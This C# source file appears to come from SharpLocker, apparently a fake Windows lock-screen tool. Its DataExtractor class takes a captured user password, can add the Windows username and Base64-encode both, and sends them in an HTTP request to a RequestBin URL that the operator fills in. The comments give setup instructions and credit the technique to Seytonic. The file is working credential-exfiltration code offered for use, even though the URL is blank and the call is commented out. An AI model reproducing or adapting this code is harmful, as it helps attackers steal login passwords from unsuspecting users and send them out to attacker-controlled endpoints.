using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace SharpLocker
{
    public static class DataExtractor
    {
        public static void Extract(string password)
        {
            //Extract with request bin
            //ExtractWithRequastBin(password);

        }
        static void ExtractWithRequastBin(string password)
        {
            //http://requestbin.net
            //RequestBin is a service that allows you to inspect requests.
            //We are going to use this to send a request with the password.
            //Creds to Seytonic

            //YOUR RequestBin link
            //format: http://requestbin.net/r/xxxxxxxx
            string url = "";

            bool EncodeWithBase64 = false;
            bool IncludeUsername = false;

            //DONT TOUCH THIS
            string p = "";

            if (IncludeUsername)
            {
                string userNameText = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                p = "Password:" + password + " Username:" + userNameText.Split('\\')[1];
            }
            else
            {
                p = password;
            }

            if (EncodeWithBase64)
            {
                var plainTextBytes = Encoding.UTF8.GetBytes(p);
                p = Convert.ToBase64String(plainTextBytes);
            }

            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + p);
            req.GetResponse();

        }
    }
}
